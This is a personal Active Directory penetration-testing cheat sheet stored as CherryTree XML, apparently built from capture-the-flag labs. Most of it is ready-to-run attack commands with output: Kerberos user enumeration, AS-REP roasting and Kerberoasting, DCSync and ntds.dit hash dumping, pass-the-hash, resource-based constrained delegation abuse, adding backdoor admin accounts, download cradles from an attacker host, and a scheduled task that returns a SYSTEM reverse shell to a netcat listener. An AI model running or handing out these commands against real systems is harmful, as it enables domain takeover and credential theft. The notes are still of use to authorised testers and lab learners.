Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.10.10.58

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">

</codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1698812222">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or without users:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
once done either check for :

</rich_text>
            <rich_text link="node 34">smb</rich_text>
            <rich_text> or </rich_text>
            <rich_text link="node 44">Using Bloodhound</rich_text>
            <rich_text> python for more data 

or

</rich_text>
            <rich_text link="node 95">evilwinrm</rich_text>
            <rich_text>  for access with the cracked password

or </rich_text>
            <rich_text link="node 102">RPCClient</rich_text>
            <rich_text> </rich_text>
            <codebox char_offset="42" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.58
#Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.58

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.10.10.58
</codebox>
            <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.10.58</codebox>
            <codebox char_offset="69" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

</codebox>
          </node>
          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
            <rich_text>• </rich_text>
            <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
            <rich_text>


</rich_text>
            <rich_text scale="h2">Via Impacket</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once done we can crack it using john

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once we get the password we should use psexec to get a shell

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
            <codebox char_offset="233" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.58 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
            <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.10.10.58</codebox>
            <codebox char_offset="347" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.58</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.10.58
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887987">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

___________________________________________________________

</rich_text>
            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@10.10.10.58</codebox>
            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system temp/SYSTEM LOCAL</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.58 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.10.10.58 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.10.10.58</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.10.58</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.58 domain.local/user</codebox>
          </node>
          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
            <rich_text>
&#13;Let's use our access with the </rich_text>
            <rich_text family="monospace">l.livingstone</rich_text>
            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
            <rich_text family="monospace">impacket-addcomputer</rich_text>
            <rich_text>.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session from before.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>



With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
            <rich_text> and use it to set </rich_text>
            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
            <rich_text> on our new machine account.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.10.10.58 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
&#13;
&#13;
DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
DNSHostName       :&#13;
Enabled           : True&#13;
Name              : ATTACK&#13;
ObjectClass       : computer&#13;
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
SamAccountName    : ATTACK$&#13;
SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
UserPrincipalName :</codebox>
            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
...&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
[*] Initializing LDAP connection to 192.168.120.181&#13;
[*] Using resourced\l.livingstone account with password ***&#13;
[*] LDAP bind OK&#13;
[*] Initializing domainDumper()&#13;
[*] Initializing LDAPAttack()&#13;
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
[*] Delegation rights modified succesfully!&#13;
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
&#13;
Path Owner                  Access&#13;
---- -----                  ------&#13;
     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
          </node>
          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
            <rich_text family="monospace">impacket-getST</rich_text>
            <rich_text> with our privileged machine account.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.10.58&#13;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Getting TGT for user&#13;
[*] Impersonating Administrator&#13;
[*]     Requesting S4U2self&#13;
[*]     Requesting S4U2Proxy&#13;
[*] Saving ticket in Administrator.ccache&#13;
</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.58 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.58 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1696728088">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

&#13;• </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> Group: According to official </rich_text>
          <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators">documentation</rich_text>
          <rich_text>, members of the </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> group are allowed create and modify users and add them to non-protected groups ( non admin )
&#13;• </rich_text>
          <rich_text family="monospace">WriteDACL</rich_text>
          <rich_text> : The WriteDACL privilege gives a user the ability to add ACLs to an&#13;object. This means that we can add a user to this group and give them </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">DCSync</rich_text>
          <rich_text> privileges that can be used to abuse and grab credential and then shell via psexec
&#13;



__________________________________________________



</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text scale="h3">Adding user to Admin  local group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Or adding them to any other group

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 or with

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>
To downoad files:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

pr
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.58</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.58</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs immed</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2">iate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connection/A</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">ccess</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different user on a</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">n AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
          <rich_text>.
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> Ex:
 
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> or
 
 
 
where ptt is pass the ticket
 
 th</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>en
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="606" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user john1 pass123 /add /domain</codebox>
          <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators john1 /add</codebox>
          <codebox char_offset="685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "EXCHANGE WINDOWS PERMISSIONS" john1 /add</codebox>
          <codebox char_offset="697" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "Exchange Windows Permissions" john1 /add /domain</codebox>
          <codebox char_offset="837" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.10.10.58/GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
          <codebox char_offset="843" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://10.10.10.58  whatever else u want with space")
</codebox>
          <codebox char_offset="1205" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="1327" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="1411" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="2196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="2206" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="2251" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text scale="h2">
&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
            <rich_text>

&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
listening on [any] 445 ...&#13;
</codebox>
            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
powershell&#13;
Windows PowerShell &#13;
Copyright (C) Microsoft Corporation. All rights reserved.&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
SUCCESS: The scheduled task "shell" has successfully been created.&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
SUCCESS: Attempted to run the scheduled task "shell".&#13;
PS C:\windows\system32\inetsrv&gt;</codebox>
            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
listening on [any] 445 ...&#13;
192.168.120.108: inverse host lookup failed: Unknown host&#13;
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
Microsoft Windows [Version 10.0.17763.1554]&#13;
(c) 2018 Microsoft Corporation. All rights reserved.&#13;
&#13;
C:\Windows\system32&gt;whoami&#13;
whoami&#13;
nt authority\system</codebox>
          </node>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

